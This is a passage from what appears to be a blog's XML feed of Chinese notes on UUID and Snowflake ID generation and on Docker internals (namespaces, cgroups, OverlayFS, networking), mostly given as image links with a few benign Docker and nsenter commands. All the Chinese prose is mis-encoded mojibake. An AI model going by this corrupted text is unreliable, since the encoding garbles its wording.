æ˜¯ç›´æ¥åœ¨ä¸šåŠ¡ä¾§çš„æœåŠ¡æœ¬åœ°äº§ç”Ÿï¼Œæ‰€ä»¥ UUID é€šå¸¸ä¹Ÿè¢«å®ç°ä¸ºä¸€ä¸ªåº“ï¼Œä¾›ä¸šåŠ¡æ–¹ç›´æ¥è°ƒç”¨ã€‚ UUID æœ‰å¾ˆå¤šä¸ªä¸åŒçš„ç‰ˆæœ¬ï¼Œç½‘ç»œä¸Šä¸åŒåº“çš„å®ç°ä¹Ÿå¯èƒ½ä¼šç•¥æœ‰åŒºåˆ«ã€‚ UUID ä¸€å…±åŒ…å«32ä½16 è¿›åˆ¶æ•°ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äº128ä½äºŒè¿›åˆ¶æ•°ï¼Œæ˜¾ç¤ºçš„æ—¶å€™è¢«åˆ†ä¸º8-4- 4-4-12å‡ ä¸ªéƒ¨åˆ†ï¼Œçœ‹ä¸€ä¸ªä¾‹å­ï¼š<br><code>0725f9ac-8cc1-11ec-a8a3-0242ac120002</code><br>æœ‰å¾ˆå¤šç‰ˆæœ¬ï¼Œæ¯”å¦‚ï¼š</p><ul><li>ç¬¬ä¸‰ä¸ªç‰ˆæœ¬çš„æ–¹æ³•æ˜¯<strong>åŸºäºåå­—è®¡ç®—çš„</strong>ï¼Œåå­—ç”±ç”¨æˆ·ä¼ å…¥ï¼Œå®ƒä¿è¯äº†ä¸åŒç©ºé—´<strong>ä¸åŒåå­—ä¸‹çš„ UUID éƒ½å…·æœ‰å”¯ä¸€æ€§ï¼Œè€Œç›¸åŒç©ºé—´ç›¸åŒåå­—ä¸‹çš„ UUID åˆ™æ˜¯ç›¸åŒçš„</strong></li><li>ç¬¬å››ä¸ªç‰ˆæœ¬æ›´åŠ å¸¸ç”¨ä¹Ÿæ›´åŠ ç›´æ¥ä¸€ç‚¹ï¼Œå°±æ˜¯<strong>ç›´æ¥åŸºäºéšæœºæ€§è¿›è¡Œè®¡ç®—</strong>ï¼Œå› ä¸ºUUIDéå¸¸é•¿ï¼Œæ‰€ä»¥å…¶é‡å¤æ¦‚ç‡å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</li></ul><h2 id="Snowflake"><a href="#Snowflake" class="headerlink" title="Snowflake"></a>Snowflake</h2><p>æ˜¯ä¸€ç§å¼•å…¥äº†æœºå™¨ç¼–å·å’Œæ—¶é—´ä¿¡æ¯çš„åˆ†å¸ƒå¼ID ç”Ÿæˆç®—æ³•ã€‚åœ¨ç†è®ºä¸Šæ¥è¯´ Snowfakeæ¯ç§’å¯ä»¥äº§ç”Ÿ 400w+ä¸ªåºå·ã€‚<br><strong>ä¸»è¦æ€è·¯å°±æ˜¯å…ˆæ ¹æ® nameï¼Œ åˆå§‹åŒ– Snowflake generator çš„å®ä¾‹ï¼Œå¼€å‘è€…éœ€è¦ä¿è¯ name çš„å”¯ä¸€æ€§ï¼›ç„¶ååœ¨éœ€è¦ç”Ÿæˆæ–°çš„IDçš„æ—¶å€™ï¼Œç”¨å½“å‰æ—¶é—´æˆ³åŠ ä¸Šå½“å‰æ—¶é—´æˆ³å†…(ä¹Ÿå°±æ˜¯æŸä¸€æ¯« ç§’å†…)çš„è®¡æ•°å™¨ï¼Œæ‹¼æ¥å¾—åˆ° UUIDï¼Œå¦‚æœæŸä¸€æ¯«ç§’å†…çš„è®¡æ•°å™¨è¢«è€—å°½è¾¾åˆ°ä¸Šé™ï¼Œä¼šæ­»å¾ªç¯ç›´è‡³ è¿™1msè¿‡å»ã€‚</strong></p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UUID </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockeræ ¸å¿ƒæŠ€æœ¯</title>
      <link href="/2022/03/21/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"/>
      <url>/2022/03/21/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¼ ç»Ÿåˆ†å±‚æ¶æ„vså¾®æœåŠ¡"><a href="#ä¼ ç»Ÿåˆ†å±‚æ¶æ„vså¾®æœåŠ¡" class="headerlink" title="ä¼ ç»Ÿåˆ†å±‚æ¶æ„vså¾®æœåŠ¡"></a>ä¼ ç»Ÿåˆ†å±‚æ¶æ„vså¾®æœåŠ¡</h2><p>ä¼ ç»Ÿåˆ†å†Œï¼šé¡¹ç›®å¤ªå¤§äº†éš¾ä»¥ç»´æŠ¤<br>å¾®æœåŠ¡ï¼šæœåŠ¡å’ŒæœåŠ¡ä¹‹é—´èµ°è½»é‡çº§çš„åè®®æ¯”å¦‚restï¼Œå®¹æ˜“ç»´æŠ¤ï¼Œæ¯ä¸ªéƒ¨åˆ†è´Ÿè´£å…¶ä¸­ä¸€éƒ¨åˆ†æœåŠ¡ã€‚<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/0.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/1.png"></p><h3 id="å¾®æœåŠ¡æ”¹é€ "><a href="#å¾®æœåŠ¡æ”¹é€ " class="headerlink" title="å¾®æœåŠ¡æ”¹é€ "></a>å¾®æœåŠ¡æ”¹é€ </h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/2.png"></p><h3 id="å¾®æœåŠ¡é—´é€šè®¯"><a href="#å¾®æœåŠ¡é—´é€šè®¯" class="headerlink" title="å¾®æœåŠ¡é—´é€šè®¯"></a>å¾®æœåŠ¡é—´é€šè®¯</h3><h4 id="ç‚¹å¯¹ç‚¹"><a href="#ç‚¹å¯¹ç‚¹" class="headerlink" title="ç‚¹å¯¹ç‚¹"></a>ç‚¹å¯¹ç‚¹</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/3.png"></h4><h4 id="APIç½‘å…³"><a href="#APIç½‘å…³" class="headerlink" title="APIç½‘å…³"></a>APIç½‘å…³</h4><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/4.png"></p><h2 id="Dockerç®€ä»‹"><a href="#Dockerç®€ä»‹" class="headerlink" title="Dockerç®€ä»‹"></a>Dockerç®€ä»‹</h2><p> <img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/5.png"></p><h3 id="ä¸ºä»€ä¹ˆç”¨Docker"><a href="#ä¸ºä»€ä¹ˆç”¨Docker" class="headerlink" title="ä¸ºä»€ä¹ˆç”¨Docker"></a>ä¸ºä»€ä¹ˆç”¨Docker</h3><p>è™šæ‹ŸåŒ–è¦è™šæ‹Ÿä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿï¼Œæœ‰é¢å¤–å¼€é”€ï¼Œå®¹å™¨åŒ–å…±äº«hostçš„kernel<br>ä¸éœ€è¦è™šæ‹Ÿæ“ä½œç³»ç»Ÿæ‰€ä»¥å¯åŠ¨æ›´å¿«<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/6.png"></p><h3 id="è™šæ‹Ÿæœºå’Œå®¹å™¨è¿è¡Œæ€çš„å¯¹æ¯”"><a href="#è™šæ‹Ÿæœºå’Œå®¹å™¨è¿è¡Œæ€çš„å¯¹æ¯”" class="headerlink" title="è™šæ‹Ÿæœºå’Œå®¹å™¨è¿è¡Œæ€çš„å¯¹æ¯”"></a>è™šæ‹Ÿæœºå’Œå®¹å™¨è¿è¡Œæ€çš„å¯¹æ¯”</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/7.png"></p><h3 id="æ€§èƒ½å¯¹æ¯”"><a href="#æ€§èƒ½å¯¹æ¯”" class="headerlink" title="æ€§èƒ½å¯¹æ¯”"></a>æ€§èƒ½å¯¹æ¯”</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/8.png"></p><h3 id="å®‰è£…Docker"><a href="#å®‰è£…Docker" class="headerlink" title="å®‰è£…Docker"></a>å®‰è£…Docker</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/9.png"></p><h3 id="å®¹å™¨æ“ä½œ"><a href="#å®¹å™¨æ“ä½œ" class="headerlink" title="å®¹å™¨æ“ä½œ"></a>å®¹å™¨æ“ä½œ</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/10.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/11.png"></p><h3 id="Docker-File"><a href="#Docker-File" class="headerlink" title="Docker File"></a>Docker File</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/12.png"></p><h3 id="å®¹å™¨æ ‡å‡†"><a href="#å®¹å™¨æ ‡å‡†" class="headerlink" title="å®¹å™¨æ ‡å‡†"></a>å®¹å™¨æ ‡å‡†</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/13.png"></p><h3 id="å®¹å™¨ä¸»è¦ç‰¹æ€§"><a href="#å®¹å™¨ä¸»è¦ç‰¹æ€§" class="headerlink" title="å®¹å™¨ä¸»è¦ç‰¹æ€§"></a>å®¹å™¨ä¸»è¦ç‰¹æ€§</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/14.png"></p><h2 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h2><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/15.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/16.png"></p><h3 id="Linux-å¯¹-Namespace-æ“ä½œæ–¹æ³•"><a href="#Linux-å¯¹-Namespace-æ“ä½œæ–¹æ³•" class="headerlink" title="Linux å¯¹ Namespace æ“ä½œæ–¹æ³•"></a>Linux å¯¹ Namespace æ“ä½œæ–¹æ³•</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/17.png"></p><h3 id="éš”ç¦»æ€§-Linux-Namespace"><a href="#éš”ç¦»æ€§-Linux-Namespace" class="headerlink" title="éš”ç¦»æ€§- Linux Namespace"></a>éš”ç¦»æ€§- Linux Namespace</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/18.png"><br>æ¯”å¦‚ä¸åŒçš„namespaceé‡Œçœ‹åˆ°çš„pidæ˜¯ä¸åŒçš„<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/19.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/20.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/21.png"></p><h3 id="å…³äº-namespace-çš„å¸¸ç”¨æ“ä½œ"><a href="#å…³äº-namespace-çš„å¸¸ç”¨æ“ä½œ" class="headerlink" title="å…³äº namespace çš„å¸¸ç”¨æ“ä½œ"></a>å…³äº namespace çš„å¸¸ç”¨æ“ä½œ</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/22.png"><br>nsenterç”¨æ³•ï¼š<br><code>docker inspect -f &#39;&#123;&#123;.State.Pid&#125;&#125;&#39; &lt;container&gt; </code>è·å–pid<br>å†<code>nsenter -t &lt;pid&gt; -n ip addr0</code></p><h2 id="Cgroups"><a href="#Cgroups" class="headerlink" title="Cgroups"></a>Cgroups</h2><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/23.png"></p><h3 id="Linux-å†…æ ¸ä»£ç ä¸­-Cgroupsçš„å®ç°"><a href="#Linux-å†…æ ¸ä»£ç ä¸­-Cgroupsçš„å®ç°" class="headerlink" title="Linux å†…æ ¸ä»£ç ä¸­ Cgroupsçš„å®ç°"></a>Linux å†…æ ¸ä»£ç ä¸­ Cgroupsçš„å®ç°</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/24.png"></p><h3 id="å¯é…é¢-å¯åº¦é‡-Control-Groups-cgroups"><a href="#å¯é…é¢-å¯åº¦é‡-Control-Groups-cgroups" class="headerlink" title="å¯é…é¢/å¯åº¦é‡-Control Groups (cgroups)"></a>å¯é…é¢/å¯åº¦é‡-Control Groups (cgroups)</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/25.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/26.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/27.png"></p><h3 id="CPUå­ç³»ç»Ÿ"><a href="#CPUå­ç³»ç»Ÿ" class="headerlink" title="CPUå­ç³»ç»Ÿ"></a>CPUå­ç³»ç»Ÿ</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/28.png"></p><h3 id="Linuxè°ƒåº¦å™¨"><a href="#Linuxè°ƒåº¦å™¨" class="headerlink" title="Linuxè°ƒåº¦å™¨"></a>Linuxè°ƒåº¦å™¨</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/29.png"></p><h3 id="CFSè°ƒåº¦å™¨"><a href="#CFSè°ƒåº¦å™¨" class="headerlink" title="CFSè°ƒåº¦å™¨"></a>CFSè°ƒåº¦å™¨</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/30.png"></p><h3 id="CFSä¸­çš„vruntimeçº¢é»‘æ ‘"><a href="#CFSä¸­çš„vruntimeçº¢é»‘æ ‘" class="headerlink" title="CFSä¸­çš„vruntimeçº¢é»‘æ ‘"></a>CFSä¸­çš„vruntimeçº¢é»‘æ ‘</h3><p>æ¯æ¬¡éƒ½ä»å·¦ä¸‹è§’å–ï¼Œå–å‡ºæ¥ä¹‹åå…¶ä»–ç»“ç‚¹å€¼ä¸å˜ï¼Œè¿è¡Œå¥½äº†å†æŠŠè¿™ä¸ªèŠ‚ç‚¹æ”¾å›æ ‘é‡Œã€‚<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/31.png"></p><h3 id="CFSè¿›ç¨‹è°ƒåº¦"><a href="#CFSè¿›ç¨‹è°ƒåº¦" class="headerlink" title="CFSè¿›ç¨‹è°ƒåº¦"></a>CFSè¿›ç¨‹è°ƒåº¦</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/32.png">æ€»ç»“ï¼šDockerèµ·è¿›ç¨‹çš„æ—¶å€™å°±æ˜¯é€šè¿‡cgroupæ§åˆ¶ä¸€ä¸‹</p><h3 id="CPU-å­ç³»ç»Ÿç»ƒä¹ "><a href="#CPU-å­ç³»ç»Ÿç»ƒä¹ " class="headerlink" title="CPU å­ç³»ç»Ÿç»ƒä¹ "></a>CPU å­ç³»ç»Ÿç»ƒä¹ </h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/33.png"><br>ä»¥ä¸‹ä»£ç åƒæ‰äº†ä¸¤ä¸ªcpu<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/34.png"><br>ç”¨cgroupæ¥ç®¡ç†å®ƒä»¬<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/35.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/36.png"><br>ç”¨ä¸‹é¢çš„è¿™äº›æ¥ç®¡ç†<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/37.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/38.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/39.png"><br>ç”¨cgroupæ¥æ§åˆ¶è¿™ä¸ªè¿›ç¨‹<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/40.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/41.png"><br>è®©ä»–åƒ1/10çš„cpu<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/42.png"></p><h3 id="cpuacctå­ç³»ç»Ÿ"><a href="#cpuacctå­ç³»ç»Ÿ" class="headerlink" title="cpuacctå­ç³»ç»Ÿ"></a>cpuacctå­ç³»ç»Ÿ</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/43.png"></p><h3 id="Memoryå­ç³»ç»Ÿ"><a href="#Memoryå­ç³»ç»Ÿ" class="headerlink" title="Memoryå­ç³»ç»Ÿ"></a>Memoryå­ç³»ç»Ÿ</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/44.png"></p><h3 id="Cgroup-driver"><a href="#Cgroup-driver" class="headerlink" title="Cgroup driver"></a>Cgroup driver</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/45.png"><br>ä¿®æ”¹æ–¹æ³•ï¼š<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/46.png"></p><h3 id="å®‰è£…k8s"><a href="#å®‰è£…k8s" class="headerlink" title="å®‰è£…k8s"></a>å®‰è£…k8s</h3><p><a href="https://github.com/cncamp/101/tree/master/k8s-install">https://github.com/cncamp/101/tree/master/k8s-install</a><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/47.png"><br><a href="https://github.com/zsnmwy/101/discussions/1">https://github.com/zsnmwy/101/discussions/1</a></p><h2 id="æ–‡ä»¶ç³»ç»Ÿ"><a href="#æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿ"></a>æ–‡ä»¶ç³»ç»Ÿ</h2><p>namespaceçš„ä½œç”¨æ˜¯æŠŠåº”ç”¨è¿›ç¨‹æ”¾åˆ°ä¸€ä¸ªå°é—­çš„ç¯å¢ƒé‡Œï¼Œç›¸å½“äºæˆ‘çš„è¿™ä¸ªåº”ç”¨çš„ä¸Šä¸‹æ¸¸çš„ä¾èµ–åŒ…æ‹¬ç½‘ç»œéƒ½åœ¨ä¸€ä¸ªéš”ç¦»ç¯å¢ƒé‡Œ<br>cgroupç”¨äºç»™è¿™ä¸ªè¿›ç¨‹ä¸€å®šçš„èµ„æºé…é¢<br>æœ‰äº†ä»–ä»¬ä¸¤ä¸ªä¸€ä¸ªå°çš„æ¨¡æ‹Ÿçš„æ“ä½œç³»ç»Ÿå°±å·²ç»åœ¨é‚£äº†ï¼Œå°±å¯ä»¥è·‘æœåŠ¡äº†<br>ä½†æ˜¯è¿˜è¦æœ‰ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®¹å™¨çš„æ–‡ä»¶ç³»ç»Ÿæ˜¯æ€ä¹ˆåšçš„<br>Dockerçš„åˆ›æ–°ç‚¹å°±åœ¨äºä»–çš„æ–‡ä»¶ç³»ç»Ÿ</p><h3 id="Union-FS"><a href="#Union-FS" class="headerlink" title="Union FS"></a>Union FS</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/48.png"></p><h3 id="å®¹å™¨é•œåƒ"><a href="#å®¹å™¨é•œåƒ" class="headerlink" title="å®¹å™¨é•œåƒ"></a>å®¹å™¨é•œåƒ</h3><p>å®¹å™¨æ˜¯åˆ†å±‚çš„ï¼Œè§£å†³äº†æ‰€æœ‰åº”ç”¨çš„æ–‡ä»¶åˆ†å‘é—®é¢˜ï¼Œå·²ç»åšè¿‡çš„å°±ä¸ç”¨åšäº†<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/49.png"></p><h3 id="Dockerçš„æ–‡ä»¶ç³»ç»Ÿ"><a href="#Dockerçš„æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="Dockerçš„æ–‡ä»¶ç³»ç»Ÿ"></a>Dockerçš„æ–‡ä»¶ç³»ç»Ÿ</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/50.png"></p><h3 id="Dockerå¯åŠ¨"><a href="#Dockerå¯åŠ¨" class="headerlink" title="Dockerå¯åŠ¨"></a>Dockerå¯åŠ¨</h3><p><strong>æ— bootfsï¼Œå¤ç”¨ä¸»æœºkernel</strong><br>**æœ‰rootfsï¼Œè¿™ä¸ªrootfsé€šè¿‡å®¹å™¨é©±åŠ¨åŠ è½½å‡ºæ¥ï¼Œå¹¶ä¸”union mountç»™è¿™ä¸ªè¿›ç¨‹ **<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/51.png"></p><h3 id="å†™æ“ä½œ"><a href="#å†™æ“ä½œ" class="headerlink" title="å†™æ“ä½œ"></a>å†™æ“ä½œ</h3><p>æ‰€æœ‰çš„è¿›ç¨‹å…±äº«åŸºç¡€å±‚ï¼Œå¢é‡å˜æ›´ï¼Œæœ‰å˜æ›´å°±æŠŠ ä¸‹é¢çš„å±‚è®¾ä¸ºread onlyï¼Œå¾€ä¸ŠåŠ <br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/52.png"></p><h3 id="å®¹å™¨å­˜å‚¨é©±åŠ¨"><a href="#å®¹å™¨å­˜å‚¨é©±åŠ¨" class="headerlink" title="å®¹å™¨å­˜å‚¨é©±åŠ¨"></a>å®¹å™¨å­˜å‚¨é©±åŠ¨</h3><p>ä¸»æµoverlayFS<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/53.png"><br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/54.png"></p><h3 id="ä»¥-OverlayFS-ä¸ºä¾‹"><a href="#ä»¥-OverlayFS-ä¸ºä¾‹" class="headerlink" title="ä»¥ OverlayFS ä¸ºä¾‹"></a>ä»¥ OverlayFS ä¸ºä¾‹</h3><p>ç”¨äºå¤šä¸ªç›®å½•åˆå¹¶æˆä¸€ä¸ªç›®å½•ï¼Œä¸‹å›¾ä¸­çš„æ–‡ä»¶mountä»£è¡¨äº†å®é™…å¯è§çš„æ–‡ä»¶<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/55.png"><br>ç”¨docker inspectå‘½ä»¤å¯ä»¥çœ‹åˆ°ç”¨overlayFSæ„å»ºçš„æ–‡ä»¶ç³»ç»Ÿ<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/56.png"><br>dockerçš„æ¯ä¸€å±‚éƒ½è¦mount<br>å¥½å¤„å°±æ˜¯è¿™æ ·æŠŠæ‰€æœ‰è¿è¡Œæ‰€éœ€çš„è¿è¡Œç¯å¢ƒé…ç½®æ–‡ä»¶å…¨éƒ¨æ”¾åˆ°è‡ªå·±å®¹å™¨è¿›ç¨‹çš„mnt namespaceé‡Œï¼Œç¡®ä¿å®¹å™¨æ‰€éœ€è¦çš„æ‰€æœ‰ä¾èµ–å’Œé…ç½®éƒ½åœ¨è¿™ä¸ªè¿è¡Œç¯å¢ƒé‡Œï¼Œè¿™æ ·æˆ‘æŠŠä»–æ”¾åˆ°å…¶ä»–ç³»ç»Ÿé‡Œæ‰èƒ½å®Œæ•´çš„replayå‡ºæ¥</p><h3 id="OCI-å®¹å™¨æ ‡å‡†"><a href="#OCI-å®¹å™¨æ ‡å‡†" class="headerlink" title="OCI å®¹å™¨æ ‡å‡†"></a>OCI å®¹å™¨æ ‡å‡†</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/57.png"></p><h3 id="Docker-å¼•æ“æ¶æ„"><a href="#Docker-å¼•æ“æ¶æ„" class="headerlink" title="Docker å¼•æ“æ¶æ„"></a>Docker å¼•æ“æ¶æ„</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/58.png"><br>containerdçš„åˆ›ä¸¾æ˜¯å’Œç”¨æˆ·æ€çš„è¿›ç¨‹è§£ç»‘äº†ï¼Œå‡çº§dockerä¹‹åç”¨æˆ·æ€è¿›ç¨‹ä¸å—å½±å“ã€‚<br>shimä¸å®¹å™¨æ˜¯1å¯¹1çš„</p><h2 id="ç½‘ç»œ"><a href="#ç½‘ç»œ" class="headerlink" title="ç½‘ç»œ"></a>ç½‘ç»œ</h2><h3 id="è§£å†³ä¸»æœºåˆ°å®¹å™¨ä»¥åŠå®¹å™¨ä¹‹é—´äº’ç›¸è®¿é—®"><a href="#è§£å†³ä¸»æœºåˆ°å®¹å™¨ä»¥åŠå®¹å™¨ä¹‹é—´äº’ç›¸è®¿é—®" class="headerlink" title="è§£å†³ä¸»æœºåˆ°å®¹å™¨ä»¥åŠå®¹å™¨ä¹‹é—´äº’ç›¸è®¿é—®"></a>è§£å†³ä¸»æœºåˆ°å®¹å™¨ä»¥åŠå®¹å™¨ä¹‹é—´äº’ç›¸è®¿é—®</h3><p>å…¶ä¸­Bridgeæ˜¯é»˜è®¤æƒ…å†µ<br>Hostä¸èƒ½ç«¯å£å¤ç”¨<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/59.png"></p><h3 id="è·¨ä¸»æœºè®¿é—®"><a href="#è·¨ä¸»æœºè®¿é—®" class="headerlink" title="è·¨ä¸»æœºè®¿é—®"></a>è·¨ä¸»æœºè®¿é—®</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/60.png"></p><h3 id="Nulæ¨¡å¼"><a href="#Nulæ¨¡å¼" class="headerlink" title="Nulæ¨¡å¼"></a>Nulæ¨¡å¼</h3><p><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/61.png"></p><h3 id="é»˜è®¤æ¨¡å¼-ç½‘æ¡¥å’Œ-NAT"><a href="#é»˜è®¤æ¨¡å¼-ç½‘æ¡¥å’Œ-NAT" class="headerlink" title="é»˜è®¤æ¨¡å¼-ç½‘æ¡¥å’Œ NAT"></a>é»˜è®¤æ¨¡å¼-ç½‘æ¡¥å’Œ NAT</h3><p>vethè¯» æ­ªæ–¯æ´¾å°”<br>ä¸‹é¢è¿™ä¸¤ä¸ªå®¹å™¨é“¾æ¥åœ¨åŒä¸€ä¸ªç½‘æ¡¥ä¸Š<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/62.png"><br>é€šè¿‡<code>brctl show</code>å°±èƒ½çœ‹åˆ°docker0<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/63.png"><br>å…¶ä¸­<code>-p</code>æŒ‡çš„æ˜¯ä¸€ä¸ªæ˜ å°„ï¼ŒæŒ‡çš„æ˜¯æŠŠä¸»æœºçš„8888ç«¯å£æ˜ å°„æˆå®¹å™¨çš„80ç«¯å£<br><img src="https://snowgo.top/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/64.png"></p><h3 id="Nulæ¨¡å¼å®ç°"><a href="#Nulæ¨¡å¼å®ç°" class="headerlink" title="Nulæ¨¡å¼å®ç°"></a>Nulæ¨¡å¼å®ç°</h3><p>ç»™ä¸€ä¸ªå®¹å™¨å»ºç½‘ç»œé¦–å…ˆè¦æŠŠnetwork spaceå»ºå‡ºæ¥<br><img 